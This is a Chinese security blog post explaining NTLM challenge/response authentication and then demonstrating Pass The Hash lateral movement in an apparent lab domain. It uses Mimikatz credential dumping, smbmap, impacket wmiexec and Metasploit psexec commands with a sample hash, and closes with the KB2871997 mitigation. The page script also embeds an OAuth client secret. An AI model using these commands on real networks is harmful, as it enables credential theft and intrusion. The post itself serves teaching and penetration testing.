<!DOCTYPE html><html lang="zh-CN"><head><meta http-equiv="content-type" content="text/html; charset=utf-8"><meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" name="viewport"><meta content="yes" name="apple-mobile-web-app-capable"><meta content="black-translucent" name="apple-mobile-web-app-status-bar-style"><meta content="telephone=no" name="format-detection"><meta name="description" content="信息安全研究方向，目前着力于Web安全与渗透测试，向往Open、Free、Share的黑客精神。同时也是一名业余ctfer。"><title>NTLM认证协议到Pass The Hash攻击 | zjun's blog</title><link rel="stylesheet" type="text/css" href="/css/style.css?v=1.0.0"><link rel="stylesheet" type="text/css" href="//cdn.jsdelivr.net/npm/normalize.css/normalize.min.css"><link rel="stylesheet" type="text/css" href="//cdn.jsdelivr.net/npm/purecss/build/pure-min.min.css"><link rel="stylesheet" type="text/css" href="//cdn.jsdelivr.net/npm/purecss/build/grids-responsive-min.css"><link rel="stylesheet" href="//cdn.jsdelivr.net/npm/font-awesome@4.7.0/css/font-awesome.min.css"><script type="text/javascript" src="//cdn.jsdelivr.net/npm/jquery/dist/jquery.min.js"></script><link rel="icon" mask="" sizes="any" href="/favicon.ico"><link rel="Shortcut Icon" type="image/x-icon" href="/favicon.ico"><link rel="apple-touch-icon" href="/apple-touch-icon.png"><link rel="apple-touch-icon-precomposed" href="/apple-touch-icon.png"><link rel="alternate" type="application/atom+xml" href="/atom.xml"><script>var _hmt = _hmt || [];
(function() {
  var hm = document.createElement("script");
  hm.src = 'https://hm.baidu.com/hm.js?' + '2bd5b990e2605fea321851cd73e77f93';
  var s = document.getElementsByTagName("script")[0];
  s.parentNode.insertBefore(hm, s);
  })();
</script><script type="text/javascript" src="//cdn.jsdelivr.net/npm/clipboard/dist/clipboard.min.js"></script><script type="text/javascript" src="//cdn.jsdelivr.net/gh/codeseven/toastr/build/toastr.min.js"></script><link rel="stylesheet" href="//cdn.jsdelivr.net/gh/codeseven/toastr/build/toastr.min.css"><meta name="generator" content="Hexo 5.3.0"></head><body><div class="body_container"><div id="header"><div class="site-name"><h1 class="hidden">NTLM认证协议到Pass The Hash攻击</h1><a id="logo" href="/.">zjun's blog</a><p class="description">潜心习安全</p></div><div id="nav-menu"><a class="current" href="/."><i class="fa fa-home"> 首页</i></a><a href="/archives/"><i class="fa fa-archive"> 归档</i></a><a href="/tags/"><i class="fa fa-tags"> 标签</i></a><a href="/timeline/"><i class="fa fa-history"> 时间线</i></a><a href="/about/"><i class="fa fa-user"> 关于</i></a><a target="_blank" rel="noopener" href="https://tools.zjun.info/"><i class="fa fa-cube"> Tools</i></a><a target="_blank" rel="noopener" href="https://github.com/z1un"><i class="fa fa-github"> Github</i></a><a href="/atom.xml"><i class="fa fa-rss"> 订阅</i></a></div></div><div class="pure-g" id="layout"><div class="pure-u-1 pure-u-md-3-4"><div class="content_container"><div class="post"><h1 class="post-title">NTLM认证协议到Pass The Hash攻击</h1><div class="post-meta">2020-08-25<span> | </span><span class="category"><a href="/categories/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/">漏洞分析</a></span></div><div class="clear"><div class="toc-article" id="toc"><div class="toc-title">文章目录</div><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#0x01-NTLM%E5%8D%8F%E8%AE%AE"><span class="toc-number">1.</span> <span class="toc-text">0x01 NTLM协议</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-%E5%8D%8F%E5%95%86"><span class="toc-number">1.1.</span> <span class="toc-text">1. 协商</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-%E8%B4%A8%E8%AF%A2"><span class="toc-number">1.2.</span> <span class="toc-text">2. 质询</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-%E8%BA%AB%E4%BB%BD%E9%AA%8C%E8%AF%81"><span class="toc-number">1.3.</span> <span class="toc-text">3. 身份验证</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x02-Pass-The-Hash%E6%94%BB%E5%87%BB"><span class="toc-number">2.</span> <span class="toc-text">0x02 Pass The Hash攻击</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-%E5%8E%9F%E7%90%86"><span class="toc-number">2.1.</span> <span class="toc-text">1. 原理</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-%E6%94%BB%E5%87%BB%E5%88%A9%E7%94%A8"><span class="toc-number">2.2.</span> <span class="toc-text">2. 攻击利用</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Mimikatz"><span class="toc-number">2.2.1.</span> <span class="toc-text">Mimikatz</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Smbmap"><span class="toc-number">2.2.2.</span> <span class="toc-text">Smbmap</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Wmiexec"><span class="toc-number">2.2.3.</span> <span class="toc-text">Wmiexec</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Metasploit-psexec%E6%A8%A1%E5%9D%97"><span class="toc-number">2.2.4.</span> <span class="toc-text">Metasploit psexec模块</span></a></li></ol></li></ol></li></ol></div></div><div class="post-content"><p>NTLM是一种网络认证协议，与NTLM Hash的关系就是：NTLM网络认证协议是以NTLM Hash作为根本凭证进行认证的协议。</p>
<a id="more"></a>
<h2 id="0x01-NTLM协议"><a href="#0x01-NTLM协议" class="headerlink" title="0x01 NTLM协议"></a>0x01 NTLM协议</h2><blockquote>
<p>In a Windows network, NT (New Technology) LAN Manager (NTLM) is a suite of Microsoft security protocols intended to provide authentication, integrity, and confidentiality to users.NTLM is the successor to the authentication protocol in Microsoft LAN Manager (LANMAN), an older Microsoft product. The NTLM protocol suite is implemented in a Security Support Provider, which combines the LAN Manager authentication protocol, NTLMv1, NTLMv2 and NTLM2 Session protocols in a single package. Whether these protocols are used or can be used on a system is governed by Group Policy settings, for which different versions of Windows have different default settings. NTLM passwords are considered weak because they can be brute-forced very easily with modern hardware.</p>
</blockquote>
<p>这段话摘自：</p>
<p><a target="_blank" rel="noopener" href="https://en.wikipedia.org/wiki/NT_LAN_Manager">https://en.wikipedia.org/wiki/NT_LAN_Manager</a></p>
<p>大概说到<code>NTLM</code>协议是<code>LM</code>（LAN Manager）协议的后继产品，其协议套件中包含<code>LM</code>、<code>NTLM v1</code>、<code>NTLM v2</code>和<code>NTLM2 Session</code>四种协议，具体该使用哪一种由组策略决定。不同版本的<code>Windows</code>版本具有不同的默认设置。其中也提到了<code>NTLM</code>协议是一种不安全的认证模式。</p>
<p> <code>NTLM</code>基于<code>Challenge/Response</code> （质询/响应）认证机制。整个认证流程分为三部分：<code>协商</code>，<code>质询</code>和<code>身份验证</code>。</p>
<h3 id="1-协商"><a href="#1-协商" class="headerlink" title="1. 协商"></a>1. 协商</h3><p>客户端向服务器发送协商消息，此消息允许客户端向服务器指定其支持的<code>NTLM</code>选项，其中就包括需要登陆的用户名，协议版本信息，签名等等。可详见官方文档<a target="_blank" rel="noopener" href="https://docs.microsoft.com/zh-cn/openspecs/windows_protocols/ms-nlmp/b34032e5-3aae-4bc6-84c3-c6d80eadf7f2">NEGOTIATE_MESSAGE</a></p>
<h3 id="2-质询"><a href="#2-质询" class="headerlink" title="2. 质询"></a>2. 质询</h3><p>这一个过程中服务器接收到了客户端的协商信息，服务器会产生一个<code>Challenge</code>，之后加密验证会依赖于<code>Challenge</code>。</p>
<blockquote>
<p><strong>challenge</strong>: A piece of data used to authenticate a user. Typically a challenge takes the form of a <a target="_blank" rel="noopener" href="https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-nlmp/780943e9-42e6-4dbe-aa87-1dce828ba82a#gt_001c0e40-0980-417d-853c-f7cb34ba6d3b">nonce</a>.</p>
</blockquote>
<p>这是来自微软官方的解释，就是说<code>Challenge</code>是用于验证用户身份的一条数据。通常，<code>Challenge</code>采用随机数的形式。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">NTLM v1这里生成的是8位的Challenge，而NTLM v2是16位的Challenge。</span><br></pre></td></tr></table></figure>
<p>服务器使用登录用户名对应的<code>NTLM Hash</code>加密<code>Challenge</code>， 得到一个<code>Net NTLM Hash</code>。同时将之前生成的随机数<code>Challenge</code>等信息发送给客户端。</p>
<p>客户端接受到<code>Challenge</code>后，使用将要登录到账户对应的<code>NTLM Hash</code>加密<code>Challenge</code>生成<code>Response</code>，然后将<code>Response</code>等信息发送至服务器端。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">NTLM v1这里的加密算法采用DES，NTLM v2采用HMAC-MD5。</span><br></pre></td></tr></table></figure>
<h3 id="3-身份验证"><a href="#3-身份验证" class="headerlink" title="3. 身份验证"></a>3. 身份验证</h3><p>服务器端接收到客户端发送的<code>Response</code>，将<code>Response</code>与自己计算得出的<code>Net NTLM Hash</code>进行比较，如果相等，则认证通过。</p>
<p>![1](<a target="_blank" rel="noopener" href="https://oss.zjun.info/zjun.info/1">https://oss.zjun.info/zjun.info/1</a> (1).png)</p>
<h2 id="0x02-Pass-The-Hash攻击"><a href="#0x02-Pass-The-Hash攻击" class="headerlink" title="0x02 Pass The Hash攻击"></a>0x02 Pass The Hash攻击</h2><h3 id="1-原理"><a href="#1-原理" class="headerlink" title="1. 原理"></a>1. 原理</h3><p>前面说到了<code>Windows</code>的网络认证，依靠<code>NTLM</code>协议，是一种点对点的认证交互模式，没有类似于<code>Kerberos</code>协议的信托机构。</p>
<p>并且在验证过程中也是没有使用到明文密码的，可以发现在客户端向服务端发起身份验证中主要的认证步骤在于向服务端发送<code>Response</code>，这意味着在某一种情况下，你在工作组或域环境中拿到了一台主机的权限，并读到了它的<code>NTLM hash</code>或<code>LM hash</code>，这时想要破解出明文密码可能会有难度，所以你选择依靠这个<code>hash</code>，在工作组或域内登陆更多的主机，因为在内网，密码一致的情况非常常见。</p>
<p>所以你可以伪装成客户端向服务端发起<code>NTLM</code>协议的认证，通过服务端对客户端发送的<code>Challenge</code>再加上你得到的<code>hash</code>，生成一个<code>Response</code>，就可以完整实现整个认证流程。</p>
<p>这个攻击方式就称为哈希传递（Pass The Hash）。</p>
<h3 id="2-攻击利用"><a href="#2-攻击利用" class="headerlink" title="2. 攻击利用"></a>2. 攻击利用</h3><p>下面介绍几种利用方式</p>
<h4 id="Mimikatz"><a href="#Mimikatz" class="headerlink" title="Mimikatz"></a>Mimikatz</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">privilege::debug</span><br><span class="line">sekurlsa::logonpasswords</span><br></pre></td></tr></table></figure>
<p><img src="https://oss.zjun.info/zjun.info/2.png" alt="2"></p>
<p>利用当前的<code>NTLM hash</code>进行传递：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sekurlsa::pth /user:administrator /domain:zjun.com /ntlm:79c89e2e7418467a4e7b55f8307260ca</span><br></pre></td></tr></table></figure>
<p><img src="https://oss.zjun.info/zjun.info/3.png" alt="3"></p>
<h4 id="Smbmap"><a href="#Smbmap" class="headerlink" title="Smbmap"></a>Smbmap</h4><p><a target="_blank" rel="noopener" href="https://github.com/ShawnDEvans/smbmap">SMBMap</a>是一个<code>SMB</code>枚举工具，功能很强大，可以命令执行，同时也支持哈希传递。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">python3 smbmap.py -u administrator -p <span class="string">&#x27;00000000000000000000000000000000:79c89e2e7418467a4e7b55f8307260ca&#x27;</span> -H 192.168.21.200 -r <span class="string">&#x27;C$\Users&#x27;</span></span><br><span class="line"><span class="comment"># 前面的32个0表示的是LM hash，但是目标主机是win 2012默认不开启LM hash，所以这里随意填入32位长度的字符即可。</span></span><br></pre></td></tr></table></figure>
<p><img src="https://oss.zjun.info/zjun.info/4.png" alt="4"></p>
<h4 id="Wmiexec"><a href="#Wmiexec" class="headerlink" title="Wmiexec"></a>Wmiexec</h4><p>python源码：</p>
<p><a target="_blank" rel="noopener" href="https://github.com/SecureAuthCorp/impacket/edit/master/examples/wmiexec.py">https://github.com/SecureAuthCorp/impacket/edit/master/examples/wmiexec.py</a></p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">python3 wmiexec.py -hashes 00000000000000000000000000000000:79c89e2e7418467a4e7b55f8307260ca ZJUN/administrator@192.168.21.200 <span class="string">&quot;whoami&quot;</span></span><br><span class="line"><span class="comment"># 前面的32个0表示的是LM hash，但是目标主机是win 2012默认不开启LM hash，所以这里随意填入32位长度的字符即可。</span></span><br></pre></td></tr></table></figure>
<p><img src="https://oss.zjun.info/zjun.info/5.png" alt="5"></p>
<p><code>windows exe</code>版本：</p>
<p><a target="_blank" rel="noopener" href="https://github.com/maaaaz/impacket-examples-windows">https://github.com/maaaaz/impacket-examples-windows</a></p>
<p><img src="https://oss.zjun.info/zjun.info/6.png" alt="6"></p>
<h4 id="Metasploit-psexec模块"><a href="#Metasploit-psexec模块" class="headerlink" title="Metasploit psexec模块"></a>Metasploit psexec模块</h4><p>直接<code>hash</code>喷射整个内网段不免缓慢，由于其依赖于<code>445</code>或<code>139</code>等端口，所以可以先扫一下段内端口开放主机。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">use auxiliary/scanner/smb/smb_version</span><br><span class="line"><span class="built_in">set</span> rhosts 192.168.21.0/24</span><br><span class="line"><span class="built_in">set</span> threads 100</span><br><span class="line">run</span><br></pre></td></tr></table></figure>
<p><img src="https://oss.zjun.info/zjun.info/7.png" alt="7"></p>
<p>再利用<code>psexec</code>模块进行哈希传递。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">use exploit/windows/smb/psexec</span><br><span class="line"><span class="built_in">set</span> lhost 192.168.0.102</span><br><span class="line"><span class="built_in">set</span> rhosts 192.168.21.200</span><br><span class="line"><span class="built_in">set</span> smbuser administrator</span><br><span class="line"><span class="built_in">set</span> smbpass 00000000000000000000000000000000:79c89e2e7418467a4e7b55f8307260ca</span><br><span class="line">run</span><br></pre></td></tr></table></figure>
<p><img src="https://oss.zjun.info/zjun.info/8.png" alt="8"></p>
<p>此外还有如<a target="_blank" rel="noopener" href="https://github.com/byt3bl33d3r/CrackMapExec">CrackMapExec</a>、<a target="_blank" rel="noopener" href="https://github.com/brav0hax/smbexec">smbexec</a>等工具。</p>
<p>对于这一缺陷，微软发布了<code>KB2871997</code>补丁，在打了该补丁后，对于<code>SID</code>非<code>500</code>的账户，无论用户名，<code>Pass The Hash</code>无法成功。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wmic useraccount get name,sid</span><br></pre></td></tr></table></figure>
<p><img src="https://oss.zjun.info/zjun.info/9.png" alt="9"></p>
</div><div id="donate"><link rel="stylesheet" type="text/css" href="/css/donate.css"><script type="text/javascript" src="/js/donate.js" successtext="复制成功!"></script><a class="pos-f tr3" id="github" target="_blank" rel="noopener" href="https://github.com/z1un" arget="_blank" title="Github"></a><div id="DonateText">Donate</div><ul class="list pos-f" id="donateBox"><li id="AliPay" qr="/img/AliPayQR.png"></li><li id="WeChat" qr="/img/WeChatQR.png"></li></ul><div class="pos-f left-100" id="QRBox"><div id="MainBox"></div></div></div><div class="post-copyright"><script type="text/javascript" src="/js/copyright.js" successtext="复制成功!"></script><link rel="stylesheet" type="text/css" href="/css/copyright.css"><p><span>本文标题：</span>NTLM认证协议到Pass The Hash攻击</p><p><span>文章作者：</span>zjun</p><p><span>发布时间：</span>2020-08-25</p><!--p--><!--    span= __('copyright_update_prefix')--><!--    = page.updated.format(config.date_format)--><p><span>原始链接：</span><a href="/2020/ntlm-authentication-to-pth-attack.html">https://blog.zjun.info/2020/ntlm-authentication-to-pth-attack.html</a><span class="copy-path"><i class="fa fa-clipboard" data-clipboard-text="https://blog.zjun.info/2020/ntlm-authentication-to-pth-attack.html"></i></span></p><p><span>版权声明：</span>本博客所有文章除特别声明外，均采用 <a href="http://creativecommons.org/licenses/by-nc-sa/3.0/cn/" rel="external nofollow" target="_blank">CC BY-NC-SA 3.0 CN</a> 许可协议。转载请注明出处！</p></div><br><script type="text/javascript" src="/js/share.js?v=1.0.0" async></script><a class="article-share-link" data-url="https://blog.zjun.info/2020/ntlm-authentication-to-pth-attack.html" data-id="ckl98rbgc001l9dry68gf0k2p" data-qrcode="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAN4AAADeCAAAAAB3DOFrAAACpklEQVR42u3aQY4bMQwEwP3/pzfX5DB2NykZDlBzWjjOrEoBJKbJn5/4+X35/P2d2d+avf/Yg4eHh3dt6U+Ap5/zLUg+yTcFDw8P7zO8pxN1tqxkKa+/2a7n8XM8PDy8L+C9OYgXR/nrohkPDw/v/+Vt4oxZeoCHh4f3nby28M2XlcQZrwvrD2UteHh4eDGvPda/4ecr/T08PDy8dVe9PXDzkKLdytmDh4eHd4PX/srNeMG9ptebwh0PDw/vMi8ZEUgwCSwZRMgHFB7fhoeHh3eUNxsqTeLa2RhBcdwnRTweHh7eNV5Lzcvidjxr30J7c+Ph4eHhXeDlAUE7ZNBu5azQL7p2eHh4eGteUsjOCus88E3wxegVHh4e3jVeW0bPmlLtVZRvx+NK8PDw8C7wkuB1X/jODvpNnIGHh4d3j5c3ojZXSBQclMd9dDnh4eHhXeBtYoVNg2pWZOf/JG+uBzw8PLwFbxawJhHqbCCgjTaKew8PDw/vEK891pPPZ3FtG1vUG4SHh4d3iJcU0Js/bRmnQorHyQg8PDy8Na9tgx2LVkcLnYUaeHh4eLd57YGbXx5JuVwsNx+6wsPDw7vMa6+EfQibXAbDMhoPDw/vGm8TxbYtrtmi2+sHDw8P75O8tgGWb9DZILgYfcDDw8O7zNsHDfl7Nm8rmmd4eHh4l3lt+3/Dni26jYnx8PDw7vHy0LZOiOONq9tayffx8PDwjvJ+y2dTu+7bXXlY/M80Lh4eHt5RXnvgtgHBrChvt6zG4OHh4a15yWWQv64lRYHCYpgADw8P7x7v7KE8uwBmN9iVmTI8PDy8o7zZwMHs+tlsPR4eHt638WY9pv0FUwfNeHh4eNd4yVJmDarZmzfvx8PDw7vNm/2Hv/1leTCxHzLAw8PDu8b7AyjNK/DFE5p6AAAAAElFTkSuQmCC">分享</a><div class="tags"><a href="/tags/windows/"><i class="fa fa-tag"></i>windows</a><a href="/tags/%E7%BD%91%E7%BB%9C%E8%AE%A4%E8%AF%81%E8%AE%A4%E8%AF%81/"><i class="fa fa-tag"></i>网络认证认证</a><a href="/tags/NTLM/"><i class="fa fa-tag"></i>NTLM</a><a href="/tags/PTH/"><i class="fa fa-tag"></i>PTH</a></div><div class="post-nav"><a class="pre" href="/2020/kerberos-protocol-to-ticket-forgery.html">Kerberos协议到票据伪造</a><a class="next" href="/2020/ciscn-2020-preliminaries.html">CISCN 2020 线上初赛部分WriteUp</a></div><div id="container"></div><link rel="stylesheet" type="text/css" href="//unpkg.com/gitalk/dist/gitalk.css?v=1.0.0"><script type="text/javascript" src="//cdn.bootcss.com/blueimp-md5/2.10.0/js/md5.js?v=1.0.0"></script><script type="text/javascript" src="//unpkg.com/gitalk/dist/gitalk.min.js?v=1.0.0"></script><script>var gitalk = new Gitalk({
  clientID: 'a29c90b69a24ed5a320d',
  clientSecret: '62b4bde8f0a28a1a782e49c56380cb10d365cd87',
  repo: 'gitalk',
  owner: 'z1un',
  proxy: 'https://netnr-proxy.cloudno.de/https://github.com/login/oauth/access_token',
  admin: ['z1un'],
  id: md5(location.pathname),
  distractionFreeMode: false
})
gitalk.render('container')
</script></div></div></div><div class="pure-u-1-4 hidden_mid_and_down"><div id="sidebar"><div class="widget"><div class="search-form"><input id="local-search-input" placeholder="Search" type="text" name="q" results="0"/><div id="local-search-result"></div></div></div><div class="widget"><div class="widget-title"><i class="fa fa-folder-o"> 分类</i></div><ul class="category-list"><li class="category-list-item"><a class="category-list-link" href="/categories/CTF/">CTF</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/Linux/">Linux</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/Other/">Other</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E5%AE%89%E5%85%A8%E5%B7%A5%E5%85%B7/">安全工具</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/">漏洞分析</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/">网络安全</a></li></ul></div><div class="widget"><div class="widget-title"><i class="fa fa-file-o"> 最近文章</i></div><ul class="post-list"><li class="post-list-item"><a class="post-list-link" href="/2021/attacking-jwt-authentication.html">JWT鉴权攻击</a></li><li class="post-list-item"><a class="post-list-link" href="/2021/about-the-online-tools-site.html">关于在线工具站点</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/z1-aggressorscripts.html">最近写的一款Cobalt Strike插件</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/analysis-of-flask-ssti-template-injection.html">浅析Flask SSTI模板注入</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/neovim-configuration-file-in-a-fast-scripting-scenario.html">快速脚本编写场景下的neovim配置文件</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/kerberos-protocol-to-ticket-forgery.html">Kerberos协议到票据伪造</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/ntlm-authentication-to-pth-attack.html">NTLM认证协议到Pass The Hash攻击</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/ciscn-2020-preliminaries.html">CISCN 2020 线上初赛部分WriteUp</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/from-windows-local-authentication-to-obtaining-hash.html">由Windows本地认证到Hash抓取</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/talking-about-intranet-penetration-agent.html">浅谈内网渗透代理</a></li></ul></div><div class="widget"><div class="widget-title"><i class="fa fa-external-link"> 友情链接</i></div><ul></ul><a href="http://www.w3bsafe.cn/" title="w3bsafe安全团队" target="_blank">w3bsafe安全团队</a><ul></ul><a href="http://www.c-hasel.cn/" title="Corey" target="_blank">Corey</a><ul></ul><a href="http://www.snow404.cn/" title="snow" target="_blank">snow</a><ul></ul><a href="http://www.hackxc.cc/" title="小陈" target="_blank">小陈</a><ul></ul><a href="https://0x20h.com/" title="Sp4ce" target="_blank">Sp4ce</a><ul></ul><a href="https://blog.cdusec.com/" title="成都大学信息安全内部博客" target="_blank">成都大学信息安全内部博客</a><ul></ul><a href="https://dna049.com/" title="dna049" target="_blank">dna049</a><ul></ul><a href="https://jokerm.com/" title="JokerM's Palace" target="_blank">JokerM's Palace</a><ul></ul><a href="https://superj.site/" title="Opt1mus" target="_blank">Opt1mus</a><ul></ul><a href="https://zgao.top/" title="zgao" target="_blank">zgao</a><ul></ul><a href="https://blog.happysec.cn/" title="小北" target="_blank">小北</a><ul></ul><a href="https://www.leavesongs.com/" title="离别歌" target="_blank">离别歌</a></div></div></div><div class="pure-u-1 pure-u-md-3-4"><!--#footer= 'Copyright © ' + date(Date.now(), 'YYYY') + ' '--><!--  a(href=url_for('.'), rel='nofollow')= config.title + '.'--><!--  |  Powered by--><!--  a(rel='nofollow', target='_blank', href='https://hexo.io')  Hexo.--><!--  a(rel='nofollow', target='_blank', href='https://github.com/tufu9441/maupassant-hexo')  Theme--><!--  |  by--><!--  a(rel='nofollow', target='_blank', href='https://github.com/pagecho')  Cho.--><div id="footer">Copyright © 2021 <a rel="nofollow" target="_blank" href="https://www.zjun.info"> ZJUN |</a><a rel="nofollow" target="_blank" href="https://beian.miit.gov.cn/"> 蜀ICP备20009085号 |</a><a rel="nofollow" target="_blank" href="http://www.beian.gov.cn/portal/registerSystemInfo?recordcode=51010802000845"> 川公网安备51010802000845号</a></div></div></div><a class="show" id="rocket" href="#top"></a><script type="text/javascript" src="/js/totop.js?v=1.0.0" async></script><script type="text/javascript" src="//cdn.jsdelivr.net/gh/fancyapps/fancybox/dist/jquery.fancybox.min.js" async></script><script type="text/javascript" src="/js/fancybox.js?v=1.0.0" async></script><link rel="stylesheet" type="text/css" href="//cdn.jsdelivr.net/gh/fancyapps/fancybox/dist/jquery.fancybox.min.css"><link rel="stylesheet" type="text/css" href="/css/search.css?v=1.0.0"><script type="text/javascript" src="/js/search.js?v=1.0.0"></script><script>var search_path = 'search.xml';
if (search_path.length == 0) {
   search_path = 'search.xml';
}
var path = '/' + search_path;
searchFunc(path, 'local-search-input', 'local-search-result');
</script><script type="text/javascript" src="/js/copycode.js" successtext="复制成功!"></script><link rel="stylesheet" type="text/css" href="/css/copycode.css"><script type="text/javascript" src="/js/codeblock-resizer.js?v=1.0.0"></script><script type="text/javascript" src="/js/smartresize.js?v=1.0.0"></script></div></body></html>